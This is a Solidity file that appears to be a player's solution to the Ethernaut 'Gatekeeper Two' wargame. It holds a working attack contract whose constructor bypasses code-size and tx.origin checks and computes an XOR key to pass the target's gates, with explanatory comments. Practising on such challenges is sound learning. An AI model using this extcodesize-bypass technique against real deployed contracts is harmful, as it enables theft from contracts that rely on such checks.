// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 *  @title ATTACK GATEKEEPER TWO
 *  @author crys
 *  @notice This will be my solution for the Ethernaut Game
 *  @dev There will be mini notes below to serve as guide.
 * Knowledge with inline assembly, opcodes and Ethereum
 * yellow paper neeeded to pass this. Also msg.sender
 * vs tx.origin knowledge.
 **/

// to pass modifier 1 need to make msg.sender != tx.origin
contract AttackGateKeeperTwo {
    // to pass modifier 2 we need x == 0 in which extcode is only euql to zero on initialization(constructor to achieve this)
    constructor(address _gateTwoAddress) public {
        // to pass modifier 3 adjust key to meet requirement by knowledge of ^ XOR
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff)
        );
        address(_gateTwoAddress).call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}
